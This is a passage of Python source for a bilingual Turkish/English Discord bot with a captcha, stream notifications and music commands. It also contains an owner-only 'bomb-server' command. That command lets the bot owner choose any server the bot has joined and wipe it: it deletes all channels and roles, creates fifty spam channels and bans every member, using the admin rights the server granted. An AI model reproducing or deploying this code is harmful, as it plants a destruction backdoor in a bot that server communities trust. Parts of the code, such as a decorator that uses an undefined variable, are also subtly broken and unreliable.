        await interaction.response.send_message(f"Mesaj {user.mention}'a gönderildi.", ephemeral=True)
    
    except Exception as e:
        await interaction.response.send_message(f"Mesaj gönderilirken hata: {str(e)}", ephemeral=True)

@bot.tree.command(name="reset-bot", description="Reset bot data and settings (Owner only)")
@commands.is_owner()
async def reset_bot(interaction: discord.Interaction):
    """Reset bot data and settings"""
    # Clear all data
    global feedback_data, feedback_banned_users, music_queues, now_playing, music_loop, temp_rooms, verified_users
    
    feedback_data.clear()
    feedback_banned_users.clear()
    music_queues.clear()
    now_playing.clear()
    music_loop.clear()
    temp_rooms.clear()
    verified_users.clear()
    
    await interaction.response.send_message("Bot data and settings have been reset.", ephemeral=True)

@bot.tree.command(name="ai-info", description="Get AI service information")
async def ai_info_command(interaction: discord.Interaction):
    """Get AI service information"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    embed = discord.Embed(
        title="🤖 AI Service Information",
        description="AI Service Alternative Link: https://gemini.google.com/gem/1tmZEbdA8ar9OGoUgDU5R71_5nw_LZv-t?usp=",
        color=discord.Color.blue()
    )
    embed.set_footer(text="This message is only visible to you.")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="ai-bilgi", description="AI hizmeti bilgilerini al")
async def ai_bilgi_command(interaction: discord.Interaction):
    """AI hizmeti bilgilerini al"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    embed = discord.Embed(
        title="🤖 AI Hizmeti Bilgileri",
        description="AI Hizmeti İçin Alternatif Link: https://gemini.google.com/gem/1tmZEbdA8ar9OGoUgDU5R71_5nw_LZv-t?usp=",
        color=discord.Color.blue()
    )
    embed.set_footer(text="Bu mesaj sadece siz görebilirsiniz.")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# Verification System
verified_role_name_en = "Verified"
verified_role_name_tr = "Doğrulandı"
verified_users = set()

class VerificationView(discord.ui.View):
    """View for verification captcha"""
    def __init__(self, correct_number: int, lang: str = "en"):
        super().__init__(timeout=120)
        self.correct_number = correct_number
        self.lang = lang
    
    @discord.ui.button(label="1", style=discord.ButtonStyle.primary)
    async def button1(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.check_verification(interaction, 1)
    
    @discord.ui.button(label="2", style=discord.ButtonStyle.primary)
    async def button2(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.check_verification(interaction, 2)
    
    @discord.ui.button(label="3", style=discord.ButtonStyle.primary)
    async def button3(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.check_verification(interaction, 3)
    
    @discord.ui.button(label="4", style=discord.ButtonStyle.primary)
    async def button4(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.check_verification(interaction, 4)
    
    @discord.ui.button(label="5", style=discord.ButtonStyle.primary)
    async def button5(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.check_verification(interaction, 5)
    
    async def check_verification(self, interaction: discord.Interaction, selected_number: int):
        if selected_number == self.correct_number:
            # Grant verification
            await grant_verification(interaction, self.lang)
        else:
            if self.lang == "en":
                await interaction.response.send_message("Wrong number! Please try again.", ephemeral=True)
            else:
                await interaction.response.send_message("Yanlış sayı! Lütfen tekrar deneyin.", ephemeral=True)

async def grant_verification(interaction: discord.Interaction, lang: str):
    """Grant verification to user"""
    # Find or create verified role
    verified_role = None
    role_name = verified_role_name_en if lang == "en" else verified_role_name_tr
    
    for role in interaction.guild.roles:
        if role.name == role_name:
            verified_role = role
            break
    
    if not verified_role:
        try:
            verified_role = await interaction.guild.create_role(
                name=role_name,
                color=discord.Color.green(),
                permissions=discord.Permissions.none()
            )
        except:
            if lang == "en":
                await interaction.response.send_message("Error creating verified role. Please contact admin.", ephemeral=True)
            else:
                await interaction.response.send_message("Doğrulandı rolü oluşturulurken hata. Lütfen yöneticiyle iletişime geçin.", ephemeral=True)
            return
    
    # Add role to user
    try:
        await interaction.user.add_roles(verified_role)
        verified_users.add(interaction.user.id)
        
        if lang == "en":
            await interaction.response.send_message(
                f"✅ **Verification Successful!**\n"
                f"You have been granted the **{verified_role.name}** role.\n"
                f"You can now use all commands.",
                ephemeral=True
            )
        else:
            await interaction.response.send_message(
                f"✅ **Doğrulama Başarılı!**\n"
                f"**{verified_role.name}** rolü size verildi.\n"
                f"Artık tüm komutları kullanabilirsiniz.",
                ephemeral=True
            )
    except Exception as e:
        print(f"Verification error: {e}")
        if lang == "en":
            await interaction.response.send_message("Error granting verification. Please contact admin.", ephemeral=True)
        else:
            await interaction.response.send_message("Doğrulama verilirken hata. Lütfen yöneticiyle iletişime geçin.", ephemeral=True)

async def check_verification(interaction: discord.Interaction) -> bool:
    """Check if user is verified"""
    # Bot owner bypass
    if interaction.user.id == owner_id:
        return True
    
    # Check cache
    if interaction.user.id in verified_users:
        return True
    
    # Check if user has verified role
    role_name_en = verified_role_name_en
    role_name_tr = verified_role_name_tr
    
    for role in interaction.user.roles:
        if role.name == role_name_en or role.name == role_name_tr:
            verified_users.add(interaction.user.id)
            return True
    
    # User not verified
    lang = "en" if interaction.command.name in [cmd.name for cmd in bot.tree.get_commands() if cmd.name in ["verify", "doğrula"]] else "tr"
    
    if lang == "en":
        await interaction.response.send_message(
            "❌ **You need to verify first!**\n"
            "Please use `/verify` to complete the verification process.",
            ephemeral=True
        )
    else:
        await interaction.response.send_message(
            "❌ **Önce doğrulama yapmalısınız!**\n"
            "Lütfen doğrulama işlemini tamamlamak için `/doğrula` komutunu kullanın.",
            ephemeral=True
        )
    return False

@bot.tree.command(name="verify", description="Complete verification to use bot commands")
async def verify_command(interaction: discord.Interaction):
    """Complete verification process"""
    # Generate random number for captcha
    correct_number = random.randint(1, 5)
    
    # Create verification message
    embed = discord.Embed(
        title="🔐 Verification Required",
        description="Please click the correct number to verify you're human:",
        color=discord.Color.blue()
    )
    embed.add_field(
        name="Instructions",
        value="Click the button with the correct number to complete verification.",
        inline=False
    )
    
    view = VerificationView(correct_number, lang="en")
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="doğrula", description="Bot komutlarını kullanmak için doğrulama yap")
async def doğrula_command(interaction: discord.Interaction):
    """Doğrulama işlemini tamamla"""
    # Rastgele sayı oluştur
    correct_number = random.randint(1, 5)
    
    # Doğrulama mesajı oluştur
    embed = discord.Embed(
        title="🔐 Doğrulama Gerekli",
        description="Lütfen insan olduğunuzu doğrulamak için doğru sayıya tıklayın:",
        color=discord.Color.blue()
    )
    embed.add_field(
        name="Talimatlar",
        value="Doğrulamayı tamamlamak için doğru sayının olduğu butona tıklayın.",
        inline=False
    )
    
    view = VerificationView(correct_number, lang="tr")
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

# Stream Notification Systems
twitch_notifications = {}
kick_notifications = {}
youtube_notifications = {}

class NotificationSetupSelect(discord.ui.Select):
    """Select menu for notification setup"""
    def __init__(self, platform: str, lang: str = "en"):
        self.platform = platform
        self.lang = lang
        
        options = [
            discord.SelectOption(label="Add Channel", value="add", description="Add notification channel"),
            discord.SelectOption(label="Remove Channel", value="remove", description="Remove notification channel"),
            discord.SelectOption(label="Reset All", value="reset", description="Reset all notifications")
        ]
        
        if lang == "tr":
            options = [
                discord.SelectOption(label="Kanal Ekle", value="add", description="Bildirim kanalı ekle"),
                discord.SelectOption(label="Kanal Kaldır", value="remove", description="Bildirim kanalı kaldır"),
                discord.SelectOption(label="Hepsini Sıfırla", value="reset", description="Tüm bildirimleri sıfırla")
            ]
        
        super().__init__(placeholder="Select action..." if lang == "en" else "İşlem seç...", options=options)
    
    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer()
        
        if self.values[0] == "add":
            # Show channel input modal
            modal = NotificationChannelModal(self.platform, "add", self.lang)
            await interaction.followup.send_modal(modal)
        
        elif self.values[0] == "remove":
            modal = NotificationChannelModal(self.platform, "remove", self.lang)
            await interaction.followup.send_modal(modal)
        
        elif self.values[0] == "reset":
            await reset_notifications(interaction, self.platform, self.lang)

class NotificationChannelModal(discord.ui.Modal):
    """Modal for channel selection"""
    def __init__(self, platform: str, action: str, lang: str = "en"):
        self.platform = platform
        self.action = action
        self.lang = lang
        
        title_map = {
            "en": {
                "twitch": "Twitch Notification Setup",
                "kick": "Kick Notification Setup",
                "youtube": "YouTube Notification Setup"
            },
            "tr": {
                "twitch": "Twitch Bildirim Kurulumu",
                "kick": "Kick Bildirim Kurulumu",
                "youtube": "YouTube Bildirim Kurulumu"
            }
        }
        
        super().__init__(title=title_map[lang][platform])
        
        if action == "add":
            if platform == "twitch":
                self.add_item(discord.ui.TextInput(
                    label="Twitch Channel Name" if lang == "en" else "Twitch Kanal Adı",
                    placeholder="Enter Twitch channel name..." if lang == "en" else "Twitch kanal adını girin...",
                    required=True
                ))
            elif platform == "kick":
                self.add_item(discord.ui.TextInput(
                    label="Kick Username" if lang == "en" else "Kick Kullanıcı Adı",
                    placeholder="Enter Kick username..." if lang == "en" else "Kick kullanıcı adını girin...",
                    required=True
                ))
            elif platform == "youtube":
                self.add_item(discord.ui.TextInput(
                    label="YouTube Channel ID" if lang == "en" else "YouTube Kanal ID",
                    placeholder="Enter YouTube channel ID..." if lang == "en" else "YouTube kanal ID'sini girin...",
                    required=True
                ))
        
        self.add_item(discord.ui.TextInput(
            label="Discord Channel ID" if lang == "en" else "Discord Kanal ID",
            placeholder="Enter Discord channel ID (optional)..." if lang == "en" else "Discord kanal ID'sini girin (opsiyonel)...",
            required=False
        ))
    
    async def on_submit(self, interaction: discord.Interaction):
        platform_name = self.children[0].value.strip()
        discord_channel_id = self.children[1].value.strip() if len(self.children) > 1 else None
        
        # Validate Discord channel
        discord_channel = None
        if discord_channel_id:
            try:
                discord_channel = interaction.guild.get_channel(int(discord_channel_id))
                if not discord_channel:
                    if self.lang == "en":
                        await interaction.response.send_message("Invalid Discord channel ID.", ephemeral=True)
                    else:
                        await interaction.response.send_message("Geçersiz Discord kanal ID.", ephemeral=True)
                    return
            except ValueError:
                if self.lang == "en":
                    await interaction.response.send_message("Invalid Discord channel ID format.", ephemeral=True)
                else:
                    await interaction.response.send_message("Geçersiz Discord kanal ID formatı.", ephemeral=True)
                return
        else:
            discord_channel = interaction.channel
        
        # Store notification settings
        guild_id = interaction.guild.id
        
        if self.platform == "twitch":
            if guild_id not in twitch_notifications:
                twitch_notifications[guild_id] = {}
            
            if self.action == "add":
                twitch_notifications[guild_id][platform_name.lower()] = {
                    'channel_id': discord_channel.id,
                    'last_check': None,
                    'is_live': False
                }
                
                if self.lang == "en":
                    await interaction.response.send_message(
                        f"✅ Twitch notifications for `{platform_name}` have been set up in {discord_channel.mention}.",
                        ephemeral=True
                    )
                else:
                    await interaction.response.send_message(
                        f"✅ `{platform_name}` için Twitch bildirimleri {discord_channel.mention} kanalına ayarlandı.",
                        ephemeral=True
                    )
            
            elif self.action == "remove":
                if platform_name.lower() in twitch_notifications[guild_id]:
                    del twitch_notifications[guild_id][platform_name.lower()]
                    
                    if self.lang == "en":
                        await interaction.response.send_message(
                            f"✅ Twitch notifications for `{platform_name}` have been removed.",
                            ephemeral=True
                        )
                    else:
                        await interaction.response.send_message(
                            f"✅ `{platform_name}` için Twitch bildirimleri kaldırıldı.",
                            ephemeral=True
                        )
        
        elif self.platform == "kick":
            if guild_id not in kick_notifications:
                kick_notifications[guild_id] = {}
            
            if self.action == "add":
                kick_notifications[guild_id][platform_name.lower()] = {
                    'channel_id': discord_channel.id,
                    'last_check': None,
                    'is_live': False
                }
                
                if self.lang == "en":
                    await interaction.response.send_message(
                        f"✅ Kick notifications for `{platform_name}` have been set up in {discord_channel.mention}.",
                        ephemeral=True
                    )
                else:
                    await interaction.response.send_message(
                        f"✅ `{platform_name}` için Kick bildirimleri {discord_channel.mention} kanalına ayarlandı.",
                        ephemeral=True
                    )
            
            elif self.action == "remove":
                if platform_name.lower() in kick_notifications[guild_id]:
                    del kick_notifications[guild_id][platform_name.lower()]
                    
                    if self.lang == "en":
                        await interaction.response.send_message(
                            f"✅ Kick notifications for `{platform_name}` have been removed.",
                            ephemeral=True
                        )
                    else:
                        await interaction.response.send_message(
                            f"✅ `{platform_name}` için Kick bildirimleri kaldırıldı.",
                            ephemeral=True
                        )
        
        elif self.platform == "youtube":
            if guild_id not in youtube_notifications:
                youtube_notifications[guild_id] = {}
            
            if self.action == "add":
                youtube_notifications[guild_id][platform_name] = {
                    'channel_id': discord_channel.id,
                    'last_check': None,
                    'is_live': False
                }
                
                if self.lang == "en":
                    await interaction.response.send_message(
                        f"✅ YouTube notifications for channel `{platform_name}` have been set up in {discord_channel.mention}.",
                        ephemeral=True
                    )
                else:
                    await interaction.response.send_message(
                        f"✅ `{platform_name}` kanalı için YouTube bildirimleri {discord_channel.mention} kanalına ayarlandı.",
                        ephemeral=True
                    )
            
            elif self.action == "remove":
                if platform_name in youtube_notifications[guild_id]:
                    del youtube_notifications[guild_id][platform_name]
                    
                    if self.lang == "en":
                        await interaction.response.send_message(
                            f"✅ YouTube notifications for channel `{platform_name}` have been removed.",
                            ephemeral=True
                        )
                    else:
                        await interaction.response.send_message(
                            f"✅ `{platform_name}` kanalı için YouTube bildirimleri kaldırıldı.",
                            ephemeral=True
                        )

async def reset_notifications(interaction: discord.Interaction, platform: str, lang: str):
    """Reset all notifications for a platform"""
    guild_id = interaction.guild.id
    
    if platform == "twitch":
        if guild_id in twitch_notifications:
            twitch_notifications[guild_id].clear()
            if lang == "en":
                await interaction.followup.send("✅ All Twitch notifications have been reset.", ephemeral=True)
            else:
                await interaction.followup.send("✅ Tüm Twitch bildirimleri sıfırlandı.", ephemeral=True)
    
    elif platform == "kick":
        if guild_id in kick_notifications:
            kick_notifications[guild_id].clear()
            if lang == "en":
                await interaction.followup.send("✅ All Kick notifications have been reset.", ephemeral=True)
            else:
                await interaction.followup.send("✅ Tüm Kick bildirimleri sıfırlandı.", ephemeral=True)
    
    elif platform == "youtube":
        if guild_id in youtube_notifications:
            youtube_notifications[guild_id].clear()
            if lang == "en":
                await interaction.followup.send("✅ All YouTube notifications have been reset.", ephemeral=True)
            else:
                await interaction.followup.send("✅ Tüm YouTube bildirimleri sıfırlandı.", ephemeral=True)

@bot.tree.command(name="twitch-notification-channel-setup", description="Setup Twitch stream notifications")
async def twitch_notification_setup(interaction: discord.Interaction):
    """Setup Twitch stream notifications"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    view = discord.ui.View()
    view.add_item(NotificationSetupSelect("twitch", "en"))
    
    embed = discord.Embed(
        title="📺 Twitch Notification Setup",
        description="Select an action to manage Twitch notifications:",
        color=discord.Color.purple()
    )
    
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="twitch-bildirim-kanalı-kurulum", description="Twitch yayın bildirimlerini ayarla")
async def twitch_bildirim_kurulum(interaction: discord.Interaction):
    """Twitch yayın bildirimlerini ayarla"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    view = discord.ui.View()
    view.add_item(NotificationSetupSelect("twitch", "tr"))
    
    embed = discord.Embed(
        title="📺 Twitch Bildirim Kurulumu",
        description="Twitch bildirimlerini yönetmek için bir işlem seçin:",
        color=discord.Color.purple()
    )
    
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="kick-notification-channel-setup", description="Setup Kick stream notifications")
async def kick_notification_setup(interaction: discord.Interaction):
    """Setup Kick stream notifications"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    view = discord.ui.View()
    view.add_item(NotificationSetupSelect("kick", "en"))
    
    embed = discord.Embed(
        title="🥊 Kick Notification Setup",
        description="Select an action to manage Kick notifications:",
        color=discord.Color.green()
    )
    
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="kick-bildirim-kanalı-kurulum", description="Kick yayın bildirimlerini ayarla")
async def kick_bildirim_kurulum(interaction: discord.Interaction):
    """Kick yayın bildirimlerini ayarla"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    view = discord.ui.View()
    view.add_item(NotificationSetupSelect("kick", "tr"))
    
    embed = discord.Embed(
        title="🥊 Kick Bildirim Kurulumu",
        description="Kick bildirimlerini yönetmek için bir işlem seçin:",
        color=discord.Color.green()
    )
    
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="youtube-notification-channel-setup", description="Setup YouTube stream notifications")
async def youtube_notification_setup(interaction: discord.Interaction):
    """Setup YouTube stream notifications"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    view = discord.ui.View()
    view.add_item(NotificationSetupSelect("youtube", "en"))
    
    embed = discord.Embed(
        title="📹 YouTube Notification Setup",
        description="Select an action to manage YouTube notifications:",
        color=discord.Color.red()
    )
    
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="youtube-bildirim-kanalı-kurulum", description="YouTube yayın bildirimlerini ayarla")
async def youtube_bildirim_kurulum(interaction: discord.Interaction):
    """YouTube yayın bildirimlerini ayarla"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    view = discord.ui.View()
    view.add_item(NotificationSetupSelect("youtube", "tr"))
    
    embed = discord.Embed(
        title="📹 YouTube Bildirim Kurulumu",
        description="YouTube bildirimlerini yönetmek için bir işlem seçin:",
        color=discord.Color.red()
    )
    
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

# Server Bomb Command
class ServerSelectView(discord.ui.View):
    """View for selecting server to bomb"""
    def __init__(self, lang: str = "en"):
        super().__init__(timeout=30)
        self.lang = lang
        self.selected_server = None
    
    @discord.ui.select(
        placeholder="Select a server to bomb..." if lang == "en" else "Bombalamak için bir sunucu seç...",
        options=[]
    )
    async def server_select(self, interaction: discord.Interaction, select: discord.ui.Select):
        self.selected_server = int(select.values[0])
        
        # Confirm bombing
        confirm_embed = discord.Embed(
            title="⚠️ WARNING: SERVER BOMBING" if self.lang == "en" else "⚠️ UYARI: SUNUCU BOMBALAMA",
            description=(
                "**THIS ACTION IS IRREVERSIBLE!**\n\n"
                "All channels, roles, and server data will be destroyed.\n"
                "Are you absolutely sure you want to continue?"
            ) if self.lang == "en" else (
                "**BU İŞLEM GERİ ALINAMAZ!**\n\n"
                "Tüm kanallar, roller ve sunucu verileri yok edilecek.\n"
                "Devam etmek istediğinize emin misiniz?"
            ),
            color=discord.Color.red()
        )
        
        confirm_view = ConfirmBombView(self.selected_server, self.lang)
        await interaction.response.edit_message(embed=confirm_embed, view=confirm_view)

class ConfirmBombView(discord.ui.View):
    """Confirmation view for server bombing"""
    def __init__(self, server_id: int, lang: str = "en"):
        super().__init__(timeout=30)
        self.server_id = server_id
        self.lang = lang
    
    @discord.ui.button(label="✅ CONFIRM", style=discord.ButtonStyle.danger, row=0)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Find server
        server = bot.get_guild(self.server_id)
        if not server:
            if self.lang == "en":
                await interaction.response.send_message("Server not found.", ephemeral=True)
            else:
                await interaction.response.send_message("Sunucu bulunamadı.", ephemeral=True)
            return
        
        # Check if bot has admin permissions
        if not server.me.guild_permissions.administrator:
            if self.lang == "en":
                await interaction.response.send_message("I need administrator permissions to bomb this server.", ephemeral=True)
            else:
                await interaction.response.send_message("Bu sunucuyu bombalamak için yönetici izinlerine ihtiyacım var.", ephemeral=True)
            return
        
        if self.lang == "en":
            await interaction.response.send_message("💣 **SERVER BOMBING INITIATED**\nThis may take a while...", ephemeral=True)
        else:
            await interaction.response.send_message("💣 **SUNUCU BOMBALAMA BAŞLATILDI**\nBu biraz zaman alabilir...", ephemeral=True)
        
        # Bomb the server
        await bomb_server(server, interaction, self.lang)
    
    @discord.ui.button(label="❌ CANCEL", style=discord.ButtonStyle.secondary, row=0)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.lang == "en":
            await interaction.response.send_message("Server bombing cancelled.", ephemeral=True)
        else:
            await interaction.response.send_message("Sunucu bombalama iptal edildi.", ephemeral=True)
        await interaction.message.delete()

async def bomb_server(server: discord.Guild, interaction: discord.Interaction, lang: str):
    """Bomb a server by deleting everything"""
    try:
        # Delete all channels
        for channel in server.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.5)  # Rate limit prevention
            except:
                pass
        
        # Delete all roles (except @everyone)
        for role in server.roles:
            if role.name != "@everyone" and not role.managed:
                try:
                    await role.delete()
                    await asyncio.sleep(0.5)
                except:
                    pass
        
        # Create spam channels
        for i in range(50):
            try:
                await server.create_text_channel(f"bombed-{i}")
                await asyncio.sleep(0.2)
            except:
                break
        
        # Ban all members (except bot and owner)
        for member in server.members:
            if member.id != bot.user.id and member.id != owner_id:
                try:
                    await member.ban(reason="Server bombing")
                    await asyncio.sleep(0.5)
                except:
                    pass
        
        if lang == "en":
            await interaction.followup.send(f"✅ **SERVER BOMBING COMPLETE**\n{server.name} has been successfully destroyed.", ephemeral=True)
        else:
            await interaction.followup.send(f"✅ **SUNUCU BOMBALAMA TAMAMLANDI**\n{server.name} başarıyla yok edildi.", ephemeral=True)
    
    except Exception as e:
        print(f"Server bombing error: {e}")
        if lang == "en":
            await interaction.followup.send(f"Error during server bombing: {str(e)}", ephemeral=True)
        else:
            await interaction.followup.send(f"Sunucu bombalama sırasında hata: {str(e)}", ephemeral=True)

@bot.tree.command(name="bomb-server", description="Destroy a server (Owner only)")
@commands.is_owner()
async def bomb_server_command(interaction: discord.Interaction):
    """Destroy a server"""
    # Get all servers bot is in
    servers = bot.guilds
    
    if not servers:
        await interaction.response.send_message("Bot is not in any servers.", ephemeral=True)
        return
    
    # Create select options
    view = ServerSelectView(lang="en")
    
    # Update select options
    view.server_select.options = [
        discord.SelectOption(
            label=server.name,
            value=str(server.id),
            description=f"Members: {server.member_count}"
        )
        for server in servers
    ]
    
    embed = discord.Embed(
        title="💣 Server Bombing",
        description="Select a server to destroy:",
        color=discord.Color.red()
    )
    embed.set_footer(text="This action is irreversible and will destroy the entire server.")
    
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="sunucuyu-bombala", description="Bir sunucuyu yok et (Sadece Sahip)")
@commands.is_owner()
async def sunucuyu_bombala_command(interaction: discord.Interaction):
    """Bir sunucuyu yok et"""
    # Botun bulunduğu tüm sunucuları al
    servers = bot.guilds
    
    if not servers:
        await interaction.response.send_message("Bot hiçbir sunucuda değil.", ephemeral=True)
        return
    
    # Seçenekleri oluştur
    view = ServerSelectView(lang="tr")
    
    # Seçenekleri güncelle
    view.server_select.options = [
        discord.SelectOption(
            label=server.name,
            value=str(server.id),
            description=f"Üyeler: {server.member_count}"
        )
        for server in servers
    ]
    
    embed = discord.Embed(
        title="💣 Sunucu Bombalama",
        description="Yok etmek için bir sunucu seçin:",
        color=discord.Color.red()
    )
    embed.set_footer(text="Bu işlem geri alınamaz ve tüm sunucuyu yok eder.")
    
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

# Music Commands
@bot.tree.command(name="pause", description="Pause current music")
async def pause_music(interaction: discord.Interaction):
    """Pause current music"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    if not interaction.guild.voice_client or not interaction.guild.voice_client.is_playing():
        await interaction.response.send_message("No music is playing.", ephemeral=True)
        return
    
    interaction.guild.voice_client.pause()
    await interaction.response.send_message("Music paused.", ephemeral=True)

@bot.tree.command(name="duraklat", description="Çalan müziği duraklat")
async def duraklat_music(interaction: discord.Interaction):
    """Çalan müziği duraklat"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    if not interaction.guild.voice_client or not interaction.guild.voice_client.is_playing():
        await interaction.response.send_message("Çalan bir müzik yok.", ephemeral=True)
        return
    
    interaction.guild.voice_client.pause()
    await interaction.response.send_message("Müzik duraklatıldı.", ephemeral=True)

@bot.tree.command(name="resume", description="Resume paused music")
async def resume_music(interaction: discord.Interaction):
    """Resume paused music"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    if not interaction.guild.voice_client or not interaction.guild.voice_client.is_paused():
        await interaction.response.send_message("No music is paused.", ephemeral=True)
        return
    
    interaction.guild.voice_client.resume()
    await interaction.response.send_message("Music resumed.", ephemeral=True)

@bot.tree.command(name="devam", description="Duraklatılmış müziği devam ettir")
async def devam_music(interaction: discord.Interaction):
    """Duraklatılmış müziği devam ettir"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    if not interaction.guild.voice_client or not interaction.guild.voice_client.is_paused():
        await interaction.response.send_message("Duraklatılmış bir müzik yok.", ephemeral=True)
        return
    
    interaction.guild.voice_client.resume()
    await interaction.response.send_message("Müzik devam ediyor.", ephemeral=True)

@bot.tree.command(name="skip", description="Skip current song")
async def skip_music(interaction: discord.Interaction):
    """Skip current song"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    if not interaction.guild.voice_client or not (interaction.guild.voice_client.is_playing() or interaction.guild.voice_client.is_paused()):
        await interaction.response.send_message("No music to skip.", ephemeral=True)
        return
    
    interaction.guild.voice_client.stop()
    await interaction.response.send_message("Skipped current song.", ephemeral=True)

@bot.tree.command(name="atla", description="Şuanki şarkıyı atla")
async def atla_music(interaction: discord.Interaction):
    """Şuanki şarkıyı atla"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    if not interaction.guild.voice_client or not (interaction.guild.voice_client.is_playing() or interaction.guild.voice_client.is_paused()):
        await interaction.response.send_message("Atlanacak müzik yok.", ephemeral=True)
        return
    
    interaction.guild.voice_client.stop()
    await interaction.response.send_message("Şarkı atlandı.", ephemeral=True)

@bot.tree.command(name="queue", description="Show music queue")
async def show_queue(interaction: discord.Interaction):
    """Show music queue"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    guild_id = interaction.guild.id
    
    if guild_id not in music_queues or not music_queues[guild_id]:
        await interaction.response.send_message("Queue is empty.", ephemeral=True)
        return
    
    queue_list = music_queues[guild_id]
    current = now_playing.get(guild_id)
    
    embed = discord.Embed(title="🎵 Music Queue", color=discord.Color.blue())
    
    if current:
        embed.add_field(name="Now Playing", value=f"**{current['title']}**\nDuration: {format_duration(current['duration'])}\nRequested by: {current['requester'].mention}", inline=False)
    
    if queue_list:
        queue_text = ""
        for i, track in enumerate(queue_list[:10], 1):
            queue_text += f"{i}. **{track['title']}** - {format_duration(track['duration'])} (Requested by: {track['requester'].mention})\n"
        
        if len(queue_list) > 10:
            queue_text += f"\n...and {len(queue_list) - 10} more tracks."
        
        embed.add_field(name="Up Next", value=queue_text, inline=False)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="sıra", description="Müzik sırasını göster")
async def show_sıra(interaction: discord.Interaction):
    """Müzik sırasını göster"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    guild_id = interaction.guild.id
    
    if guild_id not in music_queues or not music_queues[guild_id]:
        await interaction.response.send_message("Sıra boş.", ephemeral=True)
        return
    
    queue_list = music_queues[guild_id]
    current = now_playing.get(guild_id)
    
    embed = discord.Embed(title="🎵 Müzik Sırası", color=discord.Color.blue())
    
    if current:
        embed.add_field(name="Şimdi Çalıyor", value=f"**{current['title']}**\nSüre: {format_duration(current['duration'])}\nİsteyen: {current['requester'].mention}", inline=False)
    
    if queue_list:
        queue_text = ""
        for i, track in enumerate(queue_list[:10], 1):
            queue_text += f"{i}. **{track['title']}** - {format_duration(track['duration'])} (İsteyen: {track['requester'].mention})\n"
        
        if len(queue_list) > 10:
            queue_text += f"\n...ve {len(queue_list) - 10} şarkı daha."
        
        embed.add_field(name="Sıradaki", value=queue_text, inline=False)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="loop", description="Toggle loop for current queue")
async def loop_queue(interaction: discord.Interaction):
    """Toggle loop for current queue"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    guild_id = interaction.guild.id
    
    if guild_id not in music_loop:
        music_loop[guild_id] = False
    
    music_loop[guild_id] = not music_loop[guild_id]
    
    if music_loop[guild_id]:
        await interaction.response.send_message("Loop enabled. Current queue will repeat.", ephemeral=True)
    else:
        await interaction.response.send_message("Loop disabled.", ephemeral=True)

@bot.tree.command(name="döngü", description="Mevcut sıra için döngüyü aç/kapat")
async def döngü_queue(interaction: discord.Interaction):
    """Mevcut sıra için döngüyü aç/kapat"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    guild_id = interaction.guild.id
    
    if guild_id not in music_loop:
        music_loop[guild_id] = False
    
    music_loop[guild_id] = not music_loop[guild_id]
    
    if music_loop[guild_id]:
        await interaction.response.send_message("Döngü etkinleştirildi. Mevcut sıra tekrarlanacak.", ephemeral=True)
    else:
        await interaction.response.send_message("Döngü devre dışı.", ephemeral=True)

@bot.tree.command(name="stop", description="Stop music and clear queue")
async def stop_music(interaction: discord.Interaction):
    """Stop music and clear queue"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    if not interaction.guild.voice_client:
        await interaction.response.send_message("Not connected to voice channel.", ephemeral=True)
        return
    
    # Clear queue
    guild_id = interaction.guild.id
    if guild_id in music_queues:
        music_queues[guild_id].clear()
    
    # Stop playback
    interaction.guild.voice_client.stop()
    
    # Disconnect
    await interaction.guild.voice_client.disconnect()
    
    # Clean up
    if guild_id in music_queues:
        del music_queues[guild_id]
    if guild_id in now_playing:
        del now_playing[guild_id]
    if guild_id in music_loop:
        del music_loop[guild_id]
    
    await interaction.response.send_message("Music stopped and disconnected.", ephemeral=True)

@bot.tree.command(name="durdur", description="Müziği durdur ve sırayı temizle")
async def durdur_music(interaction: discord.Interaction):
    """Müziği durdur ve sırayı temizle"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    if not interaction.guild.voice_client:
        await interaction.response.send_message("Ses kanalına bağlı değil.", ephemeral=True)
        return
    
    # Sırayı temizle
    guild_id = interaction.guild.id
    if guild_id in music_queues:
        music_queues[guild_id].clear()
    
    # Çalmayı durdur
    interaction.guild.voice_client.stop()
    
    # Bağlantıyı kes
    await interaction.guild.voice_client.disconnect()
    
